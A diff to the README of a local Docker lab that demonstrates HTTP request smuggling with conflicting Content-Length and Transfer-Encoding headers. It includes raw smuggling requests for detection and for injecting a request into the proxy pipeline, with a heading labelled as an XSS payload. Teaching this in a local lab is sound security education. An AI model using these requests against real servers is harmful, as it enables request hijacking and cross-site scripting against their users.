@@ -2,30 +2,23 @@
 
 The following application demonstrate request smuggling with the headers combination `Content-Length` and `Transfer-Encoding`.
 
+### Running the lab
 
-## How to setup
+To run the lab, you need docker and docker-compose (now built in with docker).
 
-Define the following hostname in `/etc/hosts` or `C:\Windows\System32\drivers\etc\hosts`.
 ```
-127.0.0.1 simplewebsite.gosec.co
-```
-
-Docker and docker-compose are required.
-```
-docker-compose up
+> docker-compose up
 ```
 
-### Testing
-
-Open `http://simplewebsite.gosec.co` in a browser to confirm that everything is running.
+Open `http://localhost` in a browser to confirm that everything is running.
 
 
-HRS detection:
+### HRS Detection
 
 The following request need to repeated ~10 times until you get `405 Not Allowed` (Method not allowed)
 ```
 POST / HTTP/1.1
-Host: simplewebsite.gosec.co
+Host: localhost
 Content-Length: 79
 Transfer-Encoding: chunked
 
@@ -35,10 +28,12 @@ G
 ```
 
 
+### HRS XSS Payload
+
 Injecting an HTTP request in the proxy pipeline.
 ```
 POST / HTTP/1.1
-Host: simplewebsite.gosec.co
+Host: localhost
 Content-Length: 79
 Transfer-Encoding: chunked
 
